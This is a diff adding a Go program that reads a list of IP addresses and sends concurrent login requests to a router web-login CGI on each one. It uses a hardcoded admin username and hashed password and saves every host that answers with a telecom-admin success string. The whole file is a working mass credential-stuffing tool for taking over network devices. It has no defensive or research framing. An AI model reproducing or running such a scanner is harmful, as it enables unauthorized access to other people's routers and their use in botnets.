@@ -1,0 +1,140 @@
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"strings"
+	"sync"
+)
+
+func main() {
+	// Read IP addresses from the "ips.txt" file
+	ips, err := readIPsFromFile("ips.txt")
+	if err != nil {
+		fmt.Println("Error reading IP addresses:", err)
+		return
+	}
+
+	// Create a channel to limit the number of concurrent requests
+	concurrency := make(chan struct{}, 10)
+
+	// Create a wait group to ensure all goroutines finish before exiting
+	var wg sync.WaitGroup
+
+	// Open the file to save successful logins
+	successfulFile, err := os.Create("successful.txt")
+	if err != nil {
+		fmt.Println("Error creating successful.txt:", err)
+		return
+	}
+	defer successfulFile.Close()
+
+	// Create a writer to the successful file
+	successfulWriter := bufio.NewWriter(successfulFile)
+
+	// Iterate over the IP addresses
+	for _, ip := range ips {
+		wg.Add(1)
+
+		// Launch a goroutine to process each IP address concurrently
+		go func(ip string) {
+			defer wg.Done()
+
+			concurrency <- struct{}{} // Acquire a slot from the concurrency channel
+			defer func() { <-concurrency }() // Release the slot when finished processing
+
+			url := fmt.Sprintf("http://%s/aoaform/web_login_exe.cgi", ip)
+
+			// Set the request parameters
+			payload := "mode_name=/aoaform/web_login_exe&nonedata=0.301941175997837&web_login_name=admin&web_login_password=%241%24ismVkxPxPADdIuOosOaFaadd"
+			headers := map[string]string{
+				"Cache-Control":    "no-cache",
+				"User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
+				"Content-Type":     "application/x-www-form-urlencoded",
+				"Accept":           "*/*",
+				"Accept-Encoding":  "gzip, deflate",
+				"Accept-Language":  "en-US,en;q=0.9",
+				"Connection":       "close",
+			}
+
+			// Create a new HTTP client
+			client := &http.Client{}
+
+			// Create the request
+			req, err := http.NewRequest("POST", url, strings.NewReader(payload))
+			if err != nil {
+				fmt.Printf("Error creating request for %s: %s\n", ip, err)
+				return
+			}
+
+			// Set the request headers
+			for key, value := range headers {
+				if strings.Contains(value, "IP") {
+					value = strings.ReplaceAll(value, "IP", ip)
+				}
+				req.Header.Set(key, value)
+			}
+
+			// Calculate the Content-Length
+			req.Header.Set("Content-Length", fmt.Sprint(len(payload)))
+
+			// Send the request
+			res, err := client.Do(req)
+			if err != nil {
+				fmt.Printf("Error sending request to %s: %s\n", ip, err)
+				return
+			}
+			defer res.Body.Close()
+
+			// Read the response body
+			body, err := ioutil.ReadAll(res.Body)
+			if err != nil {
+				fmt.Printf("Error reading response body for %s: %s\n", ip, err)
+				return
+			}
+
+			// Check if login was successful
+			if strings.Contains(string(body), `["success_telecomadmin"]`) {
+				fmt.Printf("[UNIWAY]: Successfully logged into: %s\n", url)
+
+				// Write the successful URL to the file
+				successfulWriter.WriteString(url + "\n")
+			} else {
+				fmt.Println("[UNIWAY]: Login failed")
+			}
+		}(ip)
+	}
+
+	// Wait for all goroutines to finish
+	wg.Wait()
+
+	// Flush and close the successful file writer
+	successfulWriter.Flush()
+}
+
+// Helper function to read IP addresses from a file
+func readIPsFromFile(filename string) ([]string, error) {
+	file, err := os.Open(filename)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+
+	var ips []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		ip := strings.TrimSpace(scanner.Text())
+		if ip != "" {
+			ips = append(ips, ip)
+		}
+	}
+
+	if err := scanner.Err(); err != nil {
+		return nil, err
+	}
+
+	return ips, nil
+}
